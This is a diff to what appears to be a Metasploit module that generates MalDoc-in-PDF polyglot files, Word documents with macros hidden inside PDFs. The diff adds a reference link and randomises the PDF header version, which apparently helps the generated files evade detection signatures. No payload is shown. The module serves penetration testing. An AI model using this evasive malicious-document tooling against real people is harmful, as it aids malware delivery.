@@ -28,7 +28,8 @@ class MetasploitModule < Msf::Auxiliary
         'References' => [
           ['URL', 'https://blogs.jpcert.or.jp/en/2023/08/maldocinpdf.html'],
           ['URL', 'https://socradar.io/maldoc-in-pdf-a-novel-method-to-distribute-malicious-macros/'],
-          ['URL', 'https://www.nospamproxy.de/en/maldoc-in-pdf-danger-from-word-files-hidden-in-pdfs/']
+          ['URL', 'https://www.nospamproxy.de/en/maldoc-in-pdf-danger-from-word-files-hidden-in-pdfs/'],
+          ['URL', 'https://github.com/exa-offsec/maldoc_in_pdf_polyglot/tree/main/demo']
         ],
         'Notes' => {
           'Stability' => [CRASH_SAFE],
@@ -49,7 +50,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def create_pdf(mht)
     pdf = ''
-    pdf << "%PDF-1.7\r\n"
+    pdf << "#{rand_pdfheader}\r\n"
 
     # item 1 (catalog)
     pdf << "1 0 obj\r\n"
@@ -180,7 +181,7 @@ class MetasploitModule < Msf::Auxiliary
     trailer << "%%EOF\r\n"
 
     # assemble the final PDF
-    headers = "%PDF-1.7\r\n"
+    headers = "#{rand_pdfheader}\r\n"
     pdf = headers + updated_objects + xref + trailer
 
     # saving the file
@@ -189,6 +190,17 @@ class MetasploitModule < Msf::Auxiliary
     path = store_local(ltype, nil, pdf, fname)
 
     print_good("The file '#{fname}' is stored at '#{path}'")
+  end
+
+  def rand_pdfheader
+    # List of recognized PDF versions
+    pdf_versions = [
+      '1.0', '1.1', '1.2', '1.3', '1.4', '1.5', '1.6', '1.7', '2.0'
+    ]
+    # random verion selection
+    selected_version = pdf_versions.sample
+
+    "%PDF-#{selected_version}"
   end
 
   def run
